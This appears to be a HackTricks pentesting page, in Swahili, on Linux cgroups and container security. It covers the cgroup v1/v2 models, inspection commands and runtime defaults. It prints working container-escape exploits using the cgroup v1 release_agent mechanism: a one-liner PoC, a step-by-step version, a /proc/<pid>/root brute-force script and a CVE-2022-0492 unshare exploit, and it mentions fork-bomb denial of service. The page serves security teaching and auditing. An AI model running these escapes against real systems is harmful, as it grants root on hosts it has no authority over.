# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

**Control groups** za Linux ni mechanism ya kernel inayotumika kupanga processes pamoja kwa ajili ya accounting, limiting, prioritization, na policy enforcement. Ikiwa namespaces zinahusu hasa kutenga mwonekano wa resources, cgroups zinahusu hasa kusimamia **kiasi gani** cha resources hizo seti ya processes inaweza kutumia na, katika baadhi ya hali, **ni madarasa gani ya resources** inaweza kuingiliana nayo. Containers hutegemea cgroups kila mara, hata wakati user haiziangalii moja kwa moja, kwa sababu karibu kila runtime ya kisasa inahitaji njia ya kuiambia kernel "hizi processes ni za workload hii, na hizi ndizo resource rules zinazotumika kwake".

Hii ndiyo sababu container engines huweka container mpya kwenye cgroup subtree yake. Mara tu process tree inapokuwa humo, runtime inaweza kuweka kikomo cha memory, kupunguza idadi ya PIDs, kuweka uzito wa CPU usage, kudhibiti I/O, na kuzuia device access. Katika production environment, hili ni muhimu kwa usalama wa multi-tenant na kwa operational hygiene ya kawaida. Container isiyo na meaningful resource controls inaweza kumaliza memory, kujaza mfumo kwa processes, au kumiliki CPU na I/O kwa njia zinazofanya host au workloads jirani kukosa stability.

Kwa mtazamo wa security, cgroups zina umuhimu kwa njia mbili tofauti. Kwanza, resource limits mbaya au zinazokosekana zinawezesha denial-of-service attacks za moja kwa moja. Pili, baadhi ya cgroup features, hasa katika setups za zamani za **cgroup v1**, kihistoria zimeunda breakout primitives zenye nguvu wakati ziliweza kuandikwa kutoka ndani ya container.

## v1 Dhidi ya v2

Kuna cgroup models kuu mbili zinazotumika. **cgroup v1** inaonyesha controller hierarchies nyingi, na exploit writeups za zamani mara nyingi huhusu semantics zisizo za kawaida na wakati mwingine zenye nguvu kupita kiasi zilizopatikana humo. **cgroup v2** inaleta hierarchy iliyounganishwa zaidi na kwa ujumla behavior iliyo safi zaidi. Distributions za kisasa zinazidi kupendelea cgroup v2, lakini environments zilizochanganywa au za legacy bado zipo, jambo linalomaanisha kuwa models zote mbili bado zina umuhimu wakati wa kuchunguza systems halisi.

Tofauti hii ni muhimu kwa sababu baadhi ya container breakout stories maarufu zaidi, kama vile matumizi mabaya ya **`release_agent`** katika cgroup v1, yanahusiana mahususi na behavior ya zamani ya cgroup. Msomaji anayeona cgroup exploit kwenye blogu na kisha kuitumia bila kufikiri kwenye mfumo wa kisasa unaotumia cgroup v2 pekee anaweza kuelewa vibaya kinachowezekana kwenye target.

## Ukaguzi

Njia ya haraka zaidi ya kuona shell yako ya sasa iko wapi ni:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Faili ya `/proc/self/cgroup` huonyesha njia za cgroup zinazohusishwa na mchakato wa sasa. Kwenye host ya kisasa ya cgroup v2, mara nyingi utaona ingizo lililounganishwa. Kwenye host za zamani au mseto, unaweza kuona njia nyingi za controllers za v1. Ukishajua njia hiyo, unaweza kukagua faili zinazolingana chini ya `/sys/fs/cgroup` ili kuona limits na matumizi ya sasa.

Kwenye host ya cgroup v2, commands zifuatazo ni muhimu:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Faili hizi zinaonyesha ni controllers zipi zilizopo na ni zipi zimekabidhiwa kwa child cgroups. Modeli hii ya delegation ni muhimu katika mazingira ya rootless na yanayosimamiwa na systemd, ambapo runtime inaweza kudhibiti tu sehemu ya functionality ya cgroup ambayo parent hierarchy imekabidhi.

## Maabara

Njia moja ya kuchunguza cgroups kwa vitendo ni kuendesha container yenye kikomo cha memory:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Unaweza pia kujaribu container yenye kikomo cha PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Mifano hii ni muhimu kwa sababu husaidia kuunganisha runtime flag na kernel file interface. Runtime haisimami kutekeleza sheria hiyo kwa uchawi; inaandika mipangilio husika ya cgroup, kisha kuiacha kernel itekeleze mipangilio hiyo dhidi ya process tree.

## Matumizi ya Runtime

Docker, Podman, containerd, na CRI-O zote hutegemea cgroups kama sehemu ya uendeshaji wa kawaida. Tofauti kwa kawaida si kuhusu kama zinatumia cgroups, bali kuhusu **defaults wanazochagua**, **jinsi zinavyoingiliana na systemd**, **jinsi rootless delegation inavyofanya kazi**, na **kiasi gani cha configuration kinadhibitiwa katika kiwango cha engine dhidi ya kiwango cha orchestration**.

Katika Kubernetes, resource requests na limits hatimaye huwa cgroup configuration kwenye node. Njia kutoka Pod YAML hadi kernel enforcement hupitia kubelet, CRI runtime, na OCI runtime, lakini cgroups bado ndiyo kernel mechanism inayotumia sheria hiyo mwishowe. Katika mazingira ya Incus/LXC, cgroups pia hutumiwa sana, hasa kwa sababu system containers mara nyingi huonyesha process tree yenye maelezo zaidi na matarajio ya uendeshaji yanayofanana zaidi na VM.

## Mipangilio Isiyo Sahihi Na Breakouts

Hadithi ya kawaida ya usalama wa cgroup inahusu mechanism ya writable **cgroup v1 `release_agent`**. Katika model hiyo, ikiwa attacker angeweza kuandika kwenye cgroup files zinazofaa, kuwezesha `notify_on_release`, na kudhibiti path iliyohifadhiwa katika `release_agent`, kernel ingeweza kuishia kutekeleza path iliyochaguliwa na attacker katika initial namespaces kwenye host wakati cgroup ilipokuwa tupu. Ndiyo sababu writeups za zamani ziliweka mkazo mkubwa kwenye cgroup controller writability, mount options, na masharti ya namespace/capability.

Hata wakati `release_agent` haipatikani, makosa ya cgroup bado ni muhimu. Device access iliyo pana kupita kiasi inaweza kufanya host devices zifikike kutoka kwenye container. Kukosekana kwa memory na PID limits kunaweza kubadilisha code execution rahisi kuwa host DoS. Weak cgroup delegation katika rootless scenarios pia inaweza kuwapotosha defenders na kuwafanya waamini kuwa restriction ipo, ilhali runtime haikuweza kamwe kuitumia kwa kweli.

### `release_agent` Background

Mbinu ya `release_agent` inatumika tu kwa **cgroup v1**. Wazo la msingi ni kwamba process ya mwisho katika cgroup inapotoka na `notify_on_release=1` ikiwa imewekwa, kernel hutekeleza program ambayo path yake imehifadhiwa katika `release_agent`. Utekelezaji huo hutokea katika **initial namespaces kwenye host**, jambo linalogeuza writable `release_agent` kuwa container escape primitive.

Ili mbinu hii ifanye kazi, attacker kwa ujumla anahitaji:

- hierarchy ya **cgroup v1** inayoweza kuandikwa
- uwezo wa kuunda au kutumia child cgroup
- uwezo wa kuweka `notify_on_release`
- uwezo wa kuandika path katika `release_agent`
- path inayorejelea executable kwa mtazamo wa host

### Classic PoC

Historical one-liner PoC ni:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
PoC hii huandika njia ya payload kwenye `release_agent`, huanzisha cgroup release, kisha husoma tena faili la output lililoundwa kwenye host.

### Maelezo ya Hatua kwa Hatua

Wazo hilo linaeleweka kwa urahisi zaidi linapogawanywa katika hatua.<sup>[[1]](#references)</sup>

1. Unda na uandae cgroup inayoweza kuandikiwa:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Tambua path ya host inayolingana na filesystem ya container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Weka payload itakayoonekana kutoka kwenye host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Anzisha utekelezaji kwa kufanya cgroup iwe tupu:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Athari ni utekelezaji wa payload upande wa host ukiwa na privileges za host root. Katika exploit halisi, payload kwa kawaida huandika proof file, huanzisha reverse shell, au hubadilisha hali ya host.

### Relative Path Variant Using `/proc/<pid>/root`

Katika baadhi ya mazingira, path ya host kuelekea container filesystem si dhahiri au imefichwa na storage driver. Katika hali hiyo, path ya payload inaweza kuonyeshwa kupitia `/proc/<pid>/root/...`, ambapo `<pid>` ni host PID inayomilikiwa na process ndani ya container ya sasa. Huo ndio msingi wa relative-path brute-force variant:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Ujanja unaohusika hapa si brute force yenyewe, bali muundo wa path: `/proc/<pid>/root/...` huwezesha kernel kutatua faili iliyo ndani ya container filesystem kutoka host namespace, hata wakati direct host storage path haijulikani mapema.

### CVE-2022-0492 Variant

Mnamo 2022, CVE-2022-0492 ilionyesha kuwa kuandika kwenye `release_agent` katika cgroup v1 hakukuwa kukikagua ipasavyo `CAP_SYS_ADMIN` katika **initial** user namespace. Hili lilifanya technique hii kufikika zaidi kwenye kernels zilizo hatarini, kwa sababu container process iliyoweza ku-mount cgroup hierarchy ingeweza kuandika `release_agent` bila kuwa tayari na privileges katika host user namespace.<sup>[[3]](#references)</sup>

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Kwenye kernel iliyo hatarini, host hutekeleza `/proc/self/exe` kwa privileges za host root.

Kwa matumizi ya kiutendaji, anza kwa kuangalia ikiwa mazingira bado yanaonyesha paths za cgroup-v1 zinazoweza kuandikwa au access hatari ya devices:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ikiwa `release_agent` ipo na inaweza kuandikwa, tayari uko katika eneo la legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ikiwa cgroup path yenyewe haisababishi escape, matumizi mengine ya vitendo mara nyingi huwa ni denial of service au reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Amri hizi hukueleza kwa haraka ikiwa workload ina nafasi ya kufanya `fork-bomb`, kutumia memory kwa nguvu, au kutumia vibaya writable legacy cgroup interface.

## Ukaguzi

Wakati wa kukagua target, madhumuni ya ukaguzi wa cgroup ni kubaini ni cgroup model gani inayotumika, ikiwa container inaona controller paths zinazoweza kuandikwa, na ikiwa breakout primitives za zamani kama `release_agent` bado zina umuhimu.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Kinachovutia hapa:

- Ikiwa `mount | grep cgroup` inaonyesha **cgroup v1**, maandishi ya zamani kuhusu breakout yanakuwa muhimu zaidi.
- Ikiwa `release_agent` ipo na inaweza kufikiwa, hilo linastahili uchunguzi wa kina mara moja.
- Ikiwa cgroup hierarchy inayoonekana inaweza kuandikwa na container pia ina capabilities zenye nguvu, mazingira hayo yanastahili mapitio ya karibu zaidi.

Ukigundua **cgroup v1**, controller mounts zinazoweza kuandikwa, na container ambayo pia ina capabilities zenye nguvu au ulinzi dhaifu wa seccomp/AppArmor, mchanganyiko huo unastahili uangalizi makini. cgroups mara nyingi huchukuliwa kama mada isiyosisimua ya usimamizi wa rasilimali, lakini kihistoria zimekuwa sehemu ya baadhi ya container escape chains zenye mafunzo zaidi, hasa kwa sababu mpaka kati ya "udhibiti wa rasilimali" na "ushawishi kwenye host" haukuwa safi kila wakati kama watu walivyodhani.

## Default za Runtime

| Runtime / platform | Hali ya default | Tabia ya default | Udhaifu wa kawaida unaowekwa manually |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa default | Containers huwekwa kwenye cgroups automatically; resource limits ni za hiari isipokuwa ziwekwe kwa flags | kuacha `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Imewezeshwa kwa default | `--cgroups=enabled` ndiyo default; cgroup namespace defaults hutofautiana kulingana na cgroup version (`private` kwenye cgroup v2, `host` kwenye baadhi ya setups za cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, device access iliyorahisishwa, `--privileged` |
| Kubernetes | Imewezeshwa kupitia runtime kwa default | Pods na containers huwekwa kwenye cgroups na node runtime; udhibiti wa rasilimali wa kina hutegemea `resources.requests` / `resources.limits` | kuacha resource requests/limits, privileged device access, runtime misconfiguration ya kiwango cha host |
| containerd / CRI-O | Imewezeshwa kwa default | cgroups ni sehemu ya kawaida ya usimamizi wa lifecycle | runtime configs za moja kwa moja zinazolegeza device controls au kufichua interfaces za zamani za cgroup v1 zinazoweza kuandikwa |

Tofauti muhimu ni kwamba **uwepo wa cgroup** kwa kawaida ni wa default, huku **resource constraints zenye manufaa** mara nyingi zikiwa za hiari isipokuwa zisanidiwe waziwazi.

## Marejeo

- [1] [Kuelewa Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [New Linux Vulnerability CVE-2022-0492 Affecting Cgroups: Can Containers Escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
